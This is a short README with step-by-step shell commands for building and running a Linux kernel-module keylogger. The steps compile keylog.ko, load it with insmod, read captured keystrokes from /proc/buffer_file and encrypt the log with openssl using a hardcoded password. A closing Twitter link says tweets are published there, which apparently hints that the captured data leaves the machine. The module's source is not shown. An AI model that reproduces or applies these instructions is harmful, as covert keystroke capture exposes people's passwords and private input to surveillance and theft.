# Instructions on running the keylogger manually

With the new update no hardcoded memory is needed

Run makefile.

`$ make`

Then, you'll get keylog.ko file. Insert the module into the kernel.

`$ sudo insmod keylog.ko`

You can double check to see if the kernel was loaded properly by checking if there is "keylog" inside:

`$ lsmod`

Keylogger module can be removed with:

`$ sudo rmmod keylog`

To see the logged file:

`$ sudo cat /proc/buffer_file`

The logged file will then be encrypted and decrypted with:

`$ openssl enc -pass pass:password -aes-128-cbc -a -A -in out.txt -out encrypted.txt -nosalt`

`$ openssl enc -d -pass pass:password -aes-128-cbc -a -A -in encrypted.txt -out new.txt -nosalt`

Tweets are published to: [Link](https://twitter.com/Lemon12776532)
